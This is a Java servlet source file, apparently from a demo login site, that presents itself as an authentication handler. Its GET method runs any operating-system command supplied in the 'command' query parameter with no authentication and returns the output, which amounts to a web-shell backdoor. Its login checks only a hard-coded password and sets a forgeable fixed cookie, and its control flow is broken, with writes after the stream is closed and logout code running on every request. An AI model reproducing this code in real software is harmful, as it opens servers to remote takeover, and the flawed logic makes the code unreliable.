package communication;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStreamReader;
import java.io.OutputStream;

/**
 *
 * @author Admin
 */
public class AuthenticationServlet extends HttpServlet {

    /**
     * Processes requests for HTTP <code>POST</code> methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processPostRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        
        //get json data parameters sent by client
        //the user and password id's of the login page 
        String user = request.getParameter("user");
        String password = request.getParameter("password");
        response.sendRedirect("Demo_Site_Login.html");
        //System.out.println(user);
        //System.out.println(password);
        out.write("authentication processed");
        
        if(password.equals("welcome")){
            out.write("Welcome to iGEM");
            out.write("<br>Welcome," + user);
        //create a new cookie named authenticate with value authenticated
        Cookie authenticateCookie = new Cookie("authenticate", "authenticated");
        //add cookie once clicked on the login 
        response.addCookie(authenticateCookie);
        //set the age of the cookie
        //set the age to two hours        
        authenticateCookie.setMaxAge(60 * 120);
        //set to the next page
         
        }
        
        else{
            out.print("password or username error");
            response.sendRedirect("Demo_Site.html");
        }
        
        out.close();

        //log out portion
        String LogOut = request.getParameter("LogOut");    
        Cookie authenticateCookie = new Cookie("authenticate", "authenticated");
        authenticateCookie.setMaxAge(-1);
        response.addCookie(authenticateCookie);
        
        out.print("Logged out");
        
        

    }

    /*
     * Processes requests for HTTP <code>POST</code> methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processGetRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");

        //redirect the page to another page (can call for login button)
//        response.sendRedirect("Demo_Site.html");
        PrintWriter out = response.getWriter();
        String commandString = request.getParameter("command");
        
        System.out.println(commandString);
        String result = executeCommand(commandString);
        out.write(result);

    }

    private static String executeCommand(String command) {

        StringBuffer output = new StringBuffer();

        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader
                    = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = "";
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }

        } catch (Exception e) {
            e.printStackTrace();
            return "no result";
        }

        return output.toString();

    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processGetRequest(request, response);
    }

    /**
     * Handles the HTTP <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processPostRequest(request, response);
    }

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    @Override
    public String getServletInfo() {
        return "Short description";
    }// </editor-fold>

}